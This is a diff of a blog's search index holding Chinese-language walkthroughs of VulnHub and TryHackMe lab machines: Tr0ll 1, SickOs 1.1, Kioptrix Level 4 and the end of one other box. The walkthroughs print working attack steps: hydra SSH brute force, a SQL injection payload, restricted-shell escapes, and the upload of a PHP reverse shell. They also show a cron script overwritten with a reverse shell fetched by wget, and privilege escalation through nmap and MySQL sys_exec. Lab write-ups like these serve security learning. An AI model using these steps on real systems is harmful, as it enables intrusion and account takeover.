+<p>除了 nmap ，其余的 su、sudo 都需要有权通过 <code>sudo</code> 运行</p>
+<p>使用 nmap 提权：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">robot@linux:/$ nmap --interactive</span><br><span class="line">nmap --interactive</span><br><span class="line"></span><br><span class="line">Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )</span><br><span class="line">Welcome to Interactive Mode -- press h &lt;enter&gt; <span class="keyword">for</span> <span class="built_in">help</span></span><br><span class="line">nmap&gt; !sh</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>切换至 &#x2F;root 目录并获得第三个 key</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line">total 32</span><br><span class="line">drwx------  3 root root 4096 Nov 13  2015 .</span><br><span class="line">drwxr-xr-x 22 root root 4096 Sep 16  2015 ..</span><br><span class="line">-rw-------  1 root root 4058 Nov 14  2015 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc</span><br><span class="line">drwx------  2 root root 4096 Nov 13  2015 .cache</span><br><span class="line">-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done</span><br><span class="line">-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt</span><br><span class="line">-rw-r--r--  1 root root  140 Feb 20  2014 .profile</span><br><span class="line">-rw-------  1 root root 1024 Sep 16  2015 .rnd</span><br><span class="line"><span class="comment"># cat key-3-of-3.txt</span></span><br><span class="line">04787ddef27c3dee1ee161b21670b4e4</span><br></pre></td></tr></table></figure>
+
+<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p><img src="/picture/image-20250317212119153.png" alt="image-20250317212119153"></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>THM</tag>
       </tags>
   </entry>
   <entry>
@@ -1485,95 +1295,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Tr0ll 1 Walkthrough</title>
-    <url>/2025/04/08/Tr0ll%201/</url>
-    <content><![CDATA[<h1 id="Tr0ll-1-Walkthrough"><a href="#Tr0ll-1-Walkthrough" class="headerlink" title="Tr0ll 1 Walkthrough"></a>Tr0ll 1 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/tr0ll-1,100/">Tr0ll: 1</a></p>
-<p><img src="/picture/image-20250408213128372.png" alt="image-20250408213128372"></p>
-<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>确定存活的主机</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 192.168.186.0/24</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250407222604729.png" alt="image-20250407222604729"></p>
-<p>对目标 IP 进行端口发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 192.168.186.147</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250407222459388.png" alt="image-20250407222459388"></p>
-<p>对开放的端口进行应用版本发现</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 21,22,80 -A 192.168.186.147</span><br></pre></td></tr></table></figure>
-
-<p>发现 FTP、SSH 和 HTTP 服务</p>
-<p><img src="/picture/image-20250407222343340.png" alt="image-20250407222343340"></p>
-<p>先来看 FTP 端口，使用 FTP 客户端连接，使用 anonymous&#x2F;password 进行匿名登陆</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ftp 192.168.186.147                                                                                                       </span><br><span class="line">Name (192.168.186.147:kali): Anonymous</span><br><span class="line">Password:password</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250407222801818.png" alt="image-20250407222801818"></p>
-<p>使用 ls 列举文件，发现 pcap 文件，下载至本地</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">get lol.pcap</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250407222958945.png" alt="image-20250407222958945"></p>
-<p>使用 wireshark 打开 pcap 文件，发现是 10.0.0.6 和 10.0.0.12 之间的交互，以下是 10.0.0.6 发送的所有请求</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER anonymous</span><br><span class="line">PASS password</span><br><span class="line">SYST</span><br><span class="line">PORT 10,0,0,12,173,198</span><br><span class="line">LIST</span><br><span class="line">TYPE I</span><br><span class="line">PORT 10,0,0,12,202,172</span><br><span class="line">RETR secret_stuff.txt</span><br><span class="line">TYPE A</span><br><span class="line">PORT 10,0,0,12,172,74</span><br><span class="line">LIST</span><br><span class="line">QUIT</span><br></pre></td></tr></table></figure>
-
-<p>10.0.0.6 使用 TYPE I 设置传输模式为二进制模式后，使用 PORT 命令主动连接 10.0.0.12 的 51884 端口进行数据传输，下载 secret_stuff.txt 文件</p>
-<p>在 wireshark 读取到 secret_stuff.txt 文件内容</p>
-<p><img src="/picture/image-20250408145924485.png" alt="image-20250408145924485"></p>
-<p>意思是很接近 sup3rs3cr3tdirlol 目录了，直接访问，发现可疑文件</p>
-<p><img src="/picture/image-20250408150109374.png" alt="image-20250408150109374"></p>
-<p>下载至本地，赋予可执行权限并执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x roflmao</span><br><span class="line">./roflmao</span><br></pre></td></tr></table></figure>
-
-<p>显示了个地址没让我们进一步访问</p>
-<p><img src="/picture/image-20250408150307991.png" alt="image-20250408150307991"></p>
-<p>发现两个文件夹</p>
-<p><img src="/picture/image-20250408150352031.png" alt="image-20250408150352031"></p>
-<p>good_luck 中存放的是用户名</p>
-<p><img src="/picture/image-20250408150423470.png" alt="image-20250408150423470"></p>
-<p>this_folder_contains_the_password 存放的是 Pass.txt</p>
-<p><img src="/picture/image-20250408150513268.png" alt="image-20250408150513268"></p>
-<p><img src="/picture/image-20250408150527343.png" alt="image-20250408150527343"></p>
-<p>由于存在 FTP 和 SSH 两个服务可以使用用户名登陆，先尝试 FTP</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nv 192.168.186.147 21</span><br><span class="line">USER genphlux</span><br></pre></td></tr></table></figure>
-
-<p>FTP 服务端只允许 anonymous 登陆，看来用户名字典是属于 SSH 服务的</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nc -nv 192.168.186.147 21</span><br><span class="line">(UNKNOWN) [192.168.186.147] 21 (ftp) open</span><br><span class="line">220 (vsFTPd 3.0.2)</span><br><span class="line">USER genphlux</span><br><span class="line">530 This FTP server is anonymous only.</span><br></pre></td></tr></table></figure>
-
-<p>将 <code>Good_job_:)</code> 存储在 pass.txt 中，使用 hydra 爆破 SSH 密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt -f -t 2 -Vv ssh://192.168.186.147</span><br></pre></td></tr></table></figure>
-
-<p>发现最后一个连接被拒绝，看起来服务端对 SSH 的请求数量做了限制</p>
-<p><img src="/picture/image-20250408151424196.png" alt="image-20250408151424196"></p>
-<p>由于用户名刚好是 10 个，将它们分成 user1 和 user2 ，再分别进行爆破，结果还是一样</p>
-<p>试来试去都不行，唯一没试过的就是 <code>Pass.txt</code>  这个文件名当作密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -p Pass.txt 192.168.186.147 ssh</span><br></pre></td></tr></table></figure>
-
-<p>结果密码还真是  <code>Pass.txt</code> ，有点脑洞</p>
-<p><img src="/picture/image-20250408153754020.png" alt="image-20250408153754020"></p>
-<p>使用 SSH 远程登录</p>
-<p><img src="/picture/image-20250408160921699.png" alt="image-20250408160921699"></p>
-<p>接下来就是提权，枚举一遍后，发现如下权限为 777 的文件：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -perm 777 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/srv/ftp/lol.pcap</span><br><span class="line">/var/tmp/cleaner.py.swp</span><br><span class="line">/var/www/html/sup3rs3cr3tdirlol/roflmao</span><br><span class="line">/var/log/cronlog</span><br><span class="line">/lib/log/cleaner.py</span><br></pre></td></tr></table></figure>
-
-<p>在 &#x2F;var&#x2F;log&#x2F;cronlog 中可以发现 &#x2F;lib&#x2F;log&#x2F;cleaner.py 文件的调度任务</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /var/log/cronlog</span><br><span class="line">*/2 * * * * cleaner.py</span><br></pre></td></tr></table></figure>
-
-<p>读取 &#x2F;lib&#x2F;log&#x2F;cleaner.py 文件，发现是定期删除 &#x2F;tmp 目录下文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /lib/log/cleaner.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">        os.system(<span class="string">&#x27;rm -r /tmp/* &#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
-
-<p>在本机制作 cleaner.py ，将反弹 shell 语句写入，通过 http 服务上传并覆盖 &#x2F;lib&#x2F;log&#x2F;cleaner.py</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://&lt;IP&gt;/cleaner.py -O /lib/log/cleaner.py</span><br></pre></td></tr></table></figure>
-
-<p><img src="/picture/image-20250408161320240.png" alt="image-20250408161320240"></p>
-<p>开启 nc 监听，一会后就能获得反弹回来的 root  shell ，并获得 proof.txt</p>
-<p><img src="/picture/image-20250408161529607.png" alt="image-20250408161529607"></p>
-]]></content>
-      <categories>
-        <category>Penetration Testing</category>
-      </categories>
-      <tags>
-        <tag>Penetration Testing</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SkyTower Walkthrough</title>
     <url>/2025/04/17/SkyTower/</url>
     <content><![CDATA[<h1 id="SkyTower-Walkthrough"><a href="#SkyTower-Walkthrough" class="headerlink" title="SkyTower Walkthrough"></a>SkyTower Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/skytower-1,96/">SkyTower: 1</a></p>
@@ -1677,6 +1398,285 @@
       </tags>
   </entry>
   <entry>
+    <title>SickOs 1.1 Walkthrough</title>
+    <url>/2025/04/15/SickOs%201/</url>
+    <content><![CDATA[<h1 id="SickOs-1-1-Walkthrough"><a href="#SickOs-1-1-Walkthrough" class="headerlink" title="SickOs 1.1 Walkthrough"></a>SickOs 1.1 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/sickos-11,132/">SickOs: 1.1</a></p>
+<p><img src="/picture/image-20250415184842698.png" alt="image-20250415184842698"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>确定存活的主机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.186.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250415155934060.png" alt="image-20250415155934060"></p>
+<p>对目标 IP 进行端口发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.186.153</span><br></pre></td></tr></table></figure>
+
+<p>发现开放 22，3128 端口</p>
+<p><img src="/picture/image-20250415160011982.png" alt="image-20250415160011982"></p>
+<p>对开放的端口进行应用版本发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 22,3128 -A 192.168.186.153 </span><br></pre></td></tr></table></figure>
+
+<p>22 和 3128 端口都没有什么可以直接利用的漏洞，</p>
+<p><img src="/picture/image-20250415160104311.png" alt="image-20250415160104311"></p>
+<p>3128 端口是作为代理使用的，所以想访问 80 端口必须走 3128 端口代理，使用代理对 80 端口进行目录扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.153/ --proxy=http://192.168.186.153:3128/</span><br></pre></td></tr></table></figure>
+
+<p>发现 &#x2F;connect 和 &#x2F;robots.txt 目录</p>
+<p><img src="/picture/image-20250415160618029.png" alt="image-20250415160618029"></p>
+<p>开启 Firefox 全局代理，所有请求都要通过 3128 代理转发</p>
+<p><img src="/picture/image-20250415160839856.png" alt="image-20250415160839856"></p>
+<p>访问 80 端口主页面，没有泄露任何信息</p>
+<p><img src="/picture/image-20250415161045216.png" alt="image-20250415161045216"></p>
+<p>访问 connect 发现是谜语</p>
+<p><img src="/picture/image-20250415165355072.png" alt="image-20250415165355072"></p>
+<p>访问 robots.txt ，会发现除了 80 端口根目录外，还有 &#x2F;wolfcms 也是 Disallow 的</p>
+<p><img src="/picture/image-20250415161159986.png" alt="image-20250415161159986"></p>
+<p>访问，是 Wolf 的主目录</p>
+<p><img src="/picture/image-20250415165521729.png" alt="image-20250415165521729"></p>
+<p>对 WolfCMS 进行进一步扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.153/wolfcms --proxy=http://192.168.186.153:3128/</span><br></pre></td></tr></table></figure>
+
+<p>其中 20B 大小的内容是空的</p>
+<p><img src="/picture/image-20250415165848811.png" alt="image-20250415165848811"></p>
+<p>在 &#x2F;wolfcms&#x2F;docs&#x2F;updating.txt 文件中可以发现 Wolf CMS 版本更新至 0.8.2 </p>
+<p><img src="/picture/image-20250415170001718.png" alt="image-20250415170001718"></p>
+<p>0.8.2 后台存在文件上传漏洞，但需要登陆后台，幸运的是，弱口令直接试出来了，是 admin&#x2F;admin</p>
+<p><img src="/picture/image-20250415170207828.png" alt="image-20250415170207828"></p>
+<p>可以直接在 Files 处没有限制的上传文件，这里上传的是 kali 自带的更改 ip 和 port 后的 php-reverse-shell.php </p>
+<p>从标题中不难发现，上传至 public 目录</p>
+<p><img src="/picture/image-20250415170809740.png" alt="image-20250415170809740"></p>
+<p>成功上传</p>
+<p><img src="/picture/image-20250415170900207.png" alt="image-20250415170900207"></p>
+<p>kali 开启 nc 监听，点击访问 php 文件，即可接收到反弹回来的 shell ，并将其升级为 TTY shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250415171146164.png" alt="image-20250415171146164"></p>
+<p>接下来是提权，通过 <code>netstat -tln</code> 发现目标主机运行了 3306 端口</p>
+<p><img src="/picture/image-20250415171908364.png" alt="image-20250415171908364"></p>
+<p>在 WolfCMS 的 config.php 中可以发现 MySQL 的账号和密码</p>
+<p><img src="/picture/image-20250415172057575.png" alt="image-20250415172057575"></p>
+<p>登陆目标主机 mysql 服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u root -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250415172200514.png" alt="image-20250415172200514"></p>
+<p>可惜查看一圈并没有泄露信息，由于开放 SSH 服务，我们可以考虑尝试密码喷洒，那就要知道用户名，在 &#x2F;etc&#x2F;passwd 中找到已登录的用户名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@SickOs:/var/www$ cat /etc/passwd | grep bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>用户名是 sickos ，尝试 SSH 远程登陆账户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh sickos@192.168.186.153</span><br></pre></td></tr></table></figure>
+
+<p>成功登陆</p>
+<p><img src="/picture/image-20250415183135168.png" alt="image-20250415183135168"></p>
+<p>发现 sickos 可以使用 sudo 执行所有命令</p>
+<p><img src="/picture/image-20250415183317566.png" alt="image-20250415183317566"></p>
+<p>使用如下命令提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo sudo /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<p><img src="/picture/image-20250415183426600.png" alt="image-20250415183426600"></p>
+<p>获得 flag</p>
+<p><img src="/picture/image-20250415183518567.png" alt="image-20250415183518567"></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kioptrix Level 4 Walkthrough</title>
+    <url>/2025/04/12/Kioptrix%20Level%204/</url>
+    <content><![CDATA[<h1 id="Kioptrix-Level-4-Walkthrough"><a href="#Kioptrix-Level-4-Walkthrough" class="headerlink" title="Kioptrix Level 4 Walkthrough"></a>Kioptrix Level 4 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/">Kioptrix: Level 1.3 (#4)</a></p>
+<p><img src="/picture/image-20250412171255979.png" alt="image-20250412171255979"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>确定存活的主机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.186.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250412152621986.png" alt="image-20250412152621986"></p>
+<p>对目标 IP 进行端口发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.186.151</span><br></pre></td></tr></table></figure>
+
+<p>发现开放 22，80，139，445 端口</p>
+<p><img src="/picture/image-20250412152646226.png" alt="image-20250412152646226"></p>
+<p>对开放的端口进行应用版本发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 22,80,139,445 -A 192.168.186.151</span><br></pre></td></tr></table></figure>
+
+<p>22 端口开放 SSH 服务，80 端口开放 HTTP 服务，139 和 445 都是 SMB 服务</p>
+<p><img src="/picture/image-20250412152726245.png" alt="image-20250412152726245"></p>
+<p>先来看 22 端口 SSH 服务，看看对应版本有无可直接利用的漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit openssh 4.7</span><br></pre></td></tr></table></figure>
+
+<p>暂时没有发现什么可利用的漏洞</p>
+<p><img src="/picture/image-20250411101243184-1744442900987-9.png" alt="image-20250411101243184"></p>
+<p>再来看 80 端口，进行目录扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.150</span><br></pre></td></tr></table></figure>
+
+<p>发现可疑目录</p>
+<p><img src="/picture/image-20250412152915346.png" alt="image-20250412152915346"></p>
+<p>&#x2F;images 目录下有张 cartoon_goat.png 图片</p>
+<p><img src="/picture/image-20250412153228089.png" alt="image-20250412153228089"></p>
+<p>将其保存至本机，看看图片是否泄露信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings cartoon_goat.png</span><br></pre></td></tr></table></figure>
+
+<p>可惜没有</p>
+<p><img src="/picture/image-20250412153119443.png" alt="image-20250412153119443"></p>
+<p>直接访问 80 端口，发现是登陆页面，源码也没泄露关键信息</p>
+<p><img src="/picture/image-20250412153336276.png" alt="image-20250412153336276"></p>
+<p>尝试弱口令登陆，发现登陆失败则会 302 重定向至 &#x2F;checklogin.php</p>
+<p><img src="/picture/image-20250412153520258.png" alt="image-20250412153520258"></p>
+<p>最后来看 &#x2F;database.sql ，发现是将 john&#x2F;1234 插入 member 的 table 中，泄露账户和密码</p>
+<p><img src="/picture/image-20250412153636173.png" alt="image-20250412153636173"></p>
+<p>尝试使用 john&#x2F;1234 登陆 ssh </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -o HostKeyAlgorithms=+ssh-rsa john@192.168.186.151</span><br></pre></td></tr></table></figure>
+
+<p>登陆失败</p>
+<p><img src="/picture/image-20250412153827171.png" alt="image-20250412153827171"></p>
+<p>登陆后台，也失败</p>
+<p><img src="/picture/image-20250412153932406.png" alt="image-20250412153932406"></p>
+<p>既然都有数据库，那是否存在 SQL 注入呢？经过探查发现，在 mypassword 处发现单引号字符型注入</p>
+<p><img src="/picture/image-20250412154217894.png" alt="image-20250412154217894"></p>
+<p>试试看万能密码？由于是 post 型，所以要将注释符更改为 %23 (#)</p>
+<p><img src="/picture/image-20250412154551345.png" alt="image-20250412154551345"></p>
+<p>登陆成功，获得 john 真正的密码</p>
+<p><img src="/picture/image-20250412154435322.png" alt="image-20250412154435322"></p>
+<blockquote>
+<p>或者可以执行如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 into outfile &#x27;/var/www/user.txt&#x27; #</span><br></pre></td></tr></table></figure>
+
+<p>获得用户和密码</p>
+<p><img src="/picture/image-20250412170847009.png" alt="image-20250412170847009"></p>
+<p>该方法局限性在于网站根目录不一定是 &#x2F;var&#x2F;www</p>
+</blockquote>
+<p>尝试使用 ssh 远程登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -o HostKeyAlgorithms=+ssh-rsa john@192.168.186.151</span><br></pre></td></tr></table></figure>
+
+<p>登陆成功，但似乎是在一个受限的环境中</p>
+<p><img src="/picture/image-20250412154802099.png" alt="image-20250412154802099"></p>
+<p>在这种情况下，需要逃逸 restrict shell ，可以尝试使用如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh username@IP -t &quot;/bin/bash&quot; or &quot;/bin/sh&quot;</span><br><span class="line">ssh username@IP -t &quot;bash --noprofile&quot;</span><br><span class="line">ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot;</span><br></pre></td></tr></table></figure>
+
+<p>都失败了…</p>
+<p>由于可以执行 echo ，尝试 <code>echo os.system(&quot;/bin/bash&quot;)</code> 逃逸，逃逸成功</p>
+<p><img src="/picture/image-20250412155308111.png" alt="image-20250412155308111"></p>
+<p>接下来是提权，先查看目标主机真实开放的端口，发现有 3306 端口</p>
+<p><img src="/picture/image-20250412161508849.png" alt="image-20250412161508849"></p>
+<p>同时能发现 MySQL 以 root 身份运行</p>
+<p><img src="/picture/image-20250412162025117.png" alt="image-20250412162025117"></p>
+<p>那就去 web 网站目录看看有没有泄露 MySQL 账户密码，在 checklogin.php 出找到 root 账户的密码为空</p>
+<p><img src="/picture/image-20250412162244952.png" alt="image-20250412162244952"></p>
+<p>登陆 MySQL 服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u root -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250412162751992.png" alt="image-20250412162751992"></p>
+<p>在查看 mysql 数据库时发现存在 func 表</p>
+<p><img src="/picture/image-20250412163002390.png" alt="image-20250412163002390"></p>
+<p>且表中含有执行命令的函数</p>
+<p><img src="/picture/image-20250412163052071.png" alt="image-20250412163052071"></p>
+<p>将 john 加入 root 用户组</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_exec(&#x27;usermod -aG admin john&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>使用 sudo su 切换为 root 身份，密码为 MyNameIsJohn ，提权成功</p>
+<p><img src="/picture/image-20250412170346429.png" alt="image-20250412170346429"></p>
+<p>获得 flag</p>
+<p><img src="/picture/image-20250412170449450.png" alt="image-20250412170449450"></p>
+]]></content>
+      <categories>
+        <category>Penetration Testing</category>
+      </categories>
+      <tags>
+        <tag>Penetration Testing</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tr0ll 1 Walkthrough</title>
+    <url>/2025/04/08/Tr0ll%201/</url>
+    <content><![CDATA[<h1 id="Tr0ll-1-Walkthrough"><a href="#Tr0ll-1-Walkthrough" class="headerlink" title="Tr0ll 1 Walkthrough"></a>Tr0ll 1 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/tr0ll-1,100/">Tr0ll: 1</a></p>
+<p><img src="/picture/image-20250408213128372.png" alt="image-20250408213128372"></p>
+<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>确定存活的主机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 192.168.186.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250407222604729.png" alt="image-20250407222604729"></p>
+<p>对目标 IP 进行端口发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 192.168.186.147</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250407222459388.png" alt="image-20250407222459388"></p>
+<p>对开放的端口进行应用版本发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 21,22,80 -A 192.168.186.147</span><br></pre></td></tr></table></figure>
+
+<p>发现 FTP、SSH 和 HTTP 服务</p>
+<p><img src="/picture/image-20250407222343340.png" alt="image-20250407222343340"></p>
+<p>先来看 FTP 端口，使用 FTP 客户端连接，使用 anonymous&#x2F;password 进行匿名登陆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ftp 192.168.186.147                                                                                                       </span><br><span class="line">Name (192.168.186.147:kali): Anonymous</span><br><span class="line">Password:password</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250407222801818.png" alt="image-20250407222801818"></p>
+<p>使用 ls 列举文件，发现 pcap 文件，下载至本地</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">get lol.pcap</span><br></pre></td></tr></table></figure>
+
+<p><img src="/picture/image-20250407222958945.png" alt="image-20250407222958945"></p>
+<p>使用 wireshark 打开 pcap 文件，发现是 10.0.0.6 和 10.0.0.12 之间的交互，以下是 10.0.0.6 发送的所有请求</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER anonymous</span><br><span class="line">PASS password</span><br><span class="line">SYST</span><br><span class="line">PORT 10,0,0,12,173,198</span><br><span class="line">LIST</span><br><span class="line">TYPE I</span><br><span class="line">PORT 10,0,0,12,202,172</span><br><span class="line">RETR secret_stuff.txt</span><br><span class="line">TYPE A</span><br><span class="line">PORT 10,0,0,12,172,74</span><br><span class="line">LIST</span><br><span class="line">QUIT</span><br></pre></td></tr></table></figure>
+
+<p>10.0.0.6 使用 TYPE I 设置传输模式为二进制模式后，使用 PORT 命令主动连接 10.0.0.12 的 51884 端口进行数据传输，下载 secret_stuff.txt 文件</p>
+<p>在 wireshark 读取到 secret_stuff.txt 文件内容</p>
+<p><img src="/picture/image-20250408145924485.png" alt="image-20250408145924485"></p>
+<p>意思是很接近 sup3rs3cr3tdirlol 目录了，直接访问，发现可疑文件</p>
+<p><img src="/picture/image-20250408150109374.png" alt="image-20250408150109374"></p>
+<p>下载至本地，赋予可执行权限并执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x roflmao</span><br><span class="line">./roflmao</span><br></pre></td></tr></table></figure>
+
+<p>显示了个地址没让我们进一步访问</p>
+<p><img src="/picture/image-20250408150307991.png" alt="image-20250408150307991"></p>
+<p>发现两个文件夹</p>
+<p><img src="/picture/image-20250408150352031.png" alt="image-20250408150352031"></p>
+<p>good_luck 中存放的是用户名</p>
+<p><img src="/picture/image-20250408150423470.png" alt="image-20250408150423470"></p>
+<p>this_folder_contains_the_password 存放的是 Pass.txt</p>
+<p><img src="/picture/image-20250408150513268.png" alt="image-20250408150513268"></p>
+<p><img src="/picture/image-20250408150527343.png" alt="image-20250408150527343"></p>
+<p>由于存在 FTP 和 SSH 两个服务可以使用用户名登陆，先尝试 FTP</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nv 192.168.186.147 21</span><br><span class="line">USER genphlux</span><br></pre></td></tr></table></figure>
+
+<p>FTP 服务端只允许 anonymous 登陆，看来用户名字典是属于 SSH 服务的</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nc -nv 192.168.186.147 21</span><br><span class="line">(UNKNOWN) [192.168.186.147] 21 (ftp) open</span><br><span class="line">220 (vsFTPd 3.0.2)</span><br><span class="line">USER genphlux</span><br><span class="line">530 This FTP server is anonymous only.</span><br></pre></td></tr></table></figure>
+
+<p>将 <code>Good_job_:)</code> 存储在 pass.txt 中，使用 hydra 爆破 SSH 密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt -f -t 2 -Vv ssh://192.168.186.147</span><br></pre></td></tr></table></figure>
+
+<p>发现最后一个连接被拒绝，看起来服务端对 SSH 的请求数量做了限制</p>
+<p><img src="/picture/image-20250408151424196.png" alt="image-20250408151424196"></p>
+<p>由于用户名刚好是 10 个，将它们分成 user1 和 user2 ，再分别进行爆破，结果还是一样</p>
